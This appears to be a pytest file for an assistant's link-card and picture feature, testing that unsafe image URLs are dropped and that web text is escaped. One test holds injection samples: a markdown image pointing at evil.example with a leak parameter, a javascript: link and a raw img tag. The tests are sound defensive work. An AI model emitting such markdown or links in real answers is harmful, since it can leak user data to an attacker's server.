"""Links and pictures shown with an answer. No network."""
import json

import pytest

import cards
import live

PAGE = ("<html><head><title>SniffyNose</title><meta property='og:image' content='/logo.png'>"
        "<meta name='description' content='Pet app'></head><body>Walks</body></html>")


def serve(monkeypatch, status=200, ctype="text/html", text=PAGE):
    monkeypatch.setattr(live, "fetch", lambda url, *a, **k: (status, ctype, text))


@pytest.mark.parametrize("url", ["http://a.com/x.jpg", "https://127.0.0.1/x.jpg", "https://localhost/x.jpg",
                                 "https://[::1]/x.jpg", "javascript:alert(1)", "data:image/png;base64,AA",
                                 "https://user:pw@a.com/x.jpg", "https://a.com/x.svg", "", "https://a.com/" + "x" * 1100])
def test_unsafe_pictures_are_dropped(url):
    assert live.picture(url) == ""


def test_normal_picture_is_kept():
    assert live.picture("https://upload.wikimedia.org/a/b.jpg?width=500")


def test_web_page_becomes_a_card_and_model_gets_no_picture_addresses(monkeypatch):
    serve(monkeypatch)
    session = live.Session("what is sniffynose.com")
    told = session.run("read_webpage", json.dumps({"url": "https://sniffynose.com/"}))
    assert "logo.png" not in told and "Pet app" in told
    assert session.cards == [{"title": "SniffyNose", "url": "https://sniffynose.com/", "snippet": "Pet app",
                              "image": "https://sniffynose.com/logo.png"}]


def test_wikipedia_picture(monkeypatch):
    reply = {"query": {"pages": {"1": {"index": 1, "title": "Taj Mahal", "extract": "A monument.",
                                       "fullurl": "https://en.wikipedia.org/wiki/Taj_Mahal",
                                       "thumbnail": {"source": "https://upload.wikimedia.org/taj.jpg"}}}}}
    serve(monkeypatch, ctype="application/json", text=json.dumps(reply))
    session = live.Session("show me the Taj Mahal")
    session.run("wikipedia", json.dumps({"topic": "Taj Mahal"}))
    assert session.cards[0]["image"] == "https://upload.wikimedia.org/taj.jpg"


def test_cards_are_limited_and_unique(monkeypatch):
    session = live.Session("q")
    data = {"results": [{"title": f"t{i}", "url": f"https://a.com/{i % 6}", "snippet": "s"} for i in range(9)],
            "images": ["https://a.com/1.jpg"] * 3 + ["http://bad.com/2.jpg"]}
    session._show("web_search", data)
    session._show("web_search", data)
    assert len(session.cards) == 3 and session.images == ["https://a.com/1.jpg"]


def test_web_text_cannot_inject_links_or_images():
    evil = "![x](https://evil.example/?leak=1) [click](javascript:alert(1)) **bold** <img src=x>"
    out = cards.plain(evil)
    assert "](" not in out.replace("\\]\\(", "") and "\\!\\[x\\]\\(" in out and "\\<img" in out
    assert cards.link_url("https://a.com/x_(y) z") == "https://a.com/x_%28y%29%20z"
